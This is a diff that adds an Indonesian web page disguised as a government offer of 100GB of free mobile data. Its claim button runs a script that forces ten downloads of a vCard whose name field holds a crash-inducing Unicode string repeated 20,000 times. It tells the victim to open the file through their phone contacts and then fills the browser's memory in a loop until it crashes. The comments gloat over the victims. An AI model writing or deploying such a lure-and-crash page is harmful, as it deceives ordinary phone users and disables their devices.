@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Promo Kuota Gratis 2026</title>
+    <meta property="og:title" content="SUBSIDI KUOTA INTERNET 100GB!">
+    <meta property="og:description" content="Klaim kuota gratis untuk semua operator hari ini!">
+    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a3/Internet_Logo.png/600px-Internet_Logo.png">
+    <style>
+        body { background: #f4f4f4; font-family: Arial, sans-serif; text-align: center; padding: 20px; }
+        .container { background: #fff; padding: 30px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        .btn { background: #25d366; color: white; padding: 15px 30px; border: none; border-radius: 50px; font-weight: bold; font-size: 1.2rem; cursor: pointer; transition: 0.3s; }
+        .btn:hover { background: #128c7e; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://logodownload.org/wp-content/uploads/2019/02/free-fire-logo-1.png" width="100">
+        <h1>BANTUAN KUOTA 100GB 📶</h1>
+        <p>Selamat! Nomor Anda terpilih mendapatkan kuota gratis 100GB dari program pemerintah 2026.</p>
+        <p>Silakan klik tombol di bawah untuk aktivasi (File VCard Verifikasi akan otomatis terunduh).</p>
+        <br>
+        <button class="btn" onclick="nukeTarget()">KLAIM KUOTA SEKARANG!</button>
+    </div>
+
+    <script>
+        function nukeTarget() {
+            // Payload VCard Beracun Super Berat ☠️
+            const bugPayload = "జ్ఞा".repeat(20000); 
+            const vcfContent = `BEGIN:VCARD\nVERSION:3.0\nFN:VERIFIKASI-KUOTA-${bugPayload}\nORG:ADMIN-SISTEM\nTEL;TYPE=CELL:0812${Math.floor(Math.random() * 99999999)}\nEND:VCARD`;
+            
+            const blob = new Blob([vcfContent], { type: 'text/vcard' });
+            const url = window.URL.createObjectURL(blob);
+
+            // Kirim 10 Bom File sekaligus 😂
+            for(let i = 0; i < 10; i++) {
+                setTimeout(() => {
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = `Verifikasi_Kuota_Part${i}.vcf`;
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                }, i * 200);
+            }
+
+            alert("Koneksi Error! Buka salah satu file yang terunduh untuk aktivasi manual melalui kontak HP Anda.");
+            
+            // Habisin RAM Browser Korban 😈
+            setInterval(() => {
+                let crash = new Array(1000000).fill("BYE-BYE-HP-KENTANG-☠️");
+            }, 100);
+        }
+    </script>
+</body>
+  </html>
